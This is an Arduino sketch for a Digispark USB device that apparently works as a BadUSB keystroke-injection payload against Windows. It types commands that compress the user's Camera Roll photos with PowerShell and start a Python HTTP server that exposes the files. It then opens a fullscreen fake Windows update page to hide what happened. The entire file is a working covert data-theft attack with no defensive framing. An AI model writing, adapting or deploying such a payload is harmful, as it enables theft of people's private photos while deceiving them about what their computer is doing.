#include "DigiKeyboard.h"

void setup() {
  // Empty setup
}

void loop() {
  DigiKeyboard.delay(2000); // Wait for 2 seconds before starting

  // Open the Command Prompt via Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Open Run dialog
  DigiKeyboard.delay(600);
  DigiKeyboard.print("cmd");  // Command to open Command Prompt
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);  // Wait for the Command Prompt to open

  // Zip the folder
  DigiKeyboard.print("powershell Compress-Archive -Path 'C:\\Users\\4n0nym0u$~1012\\Pictures\\Camera Roll' -DestinationPath 'C:\\Users\\4n0nym0u$~1012\\Pictures\\CameraRoll.zip'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);  // Wait for the zipping process to complete

  // Start a Python HTTP server
  DigiKeyboard.print("python -m http.server");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("http://fakeupdate.net/win10ue"); //Abre o site
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F11);

  // Keep the Digispark idle to prevent re-running
  for (;;) {
    // Do nothing
  }
}
